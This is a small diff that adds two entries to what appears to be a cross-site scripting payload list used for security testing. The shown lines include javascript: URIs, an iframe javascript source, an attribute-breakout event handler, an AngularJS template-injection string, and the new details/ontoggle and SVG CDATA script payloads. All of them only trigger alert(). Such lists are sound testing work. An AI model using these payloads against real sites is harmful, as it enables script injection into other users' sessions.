@@ -4,3 +4,5 @@ javascript:alert('DOM-XSS')
 <iframe src="javascript:alert(`xss`)">
 x" onmouseover="alert(1)" b="
 {{constructor.constructor('alert(1)')()}}
+<details open ontoggle=alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
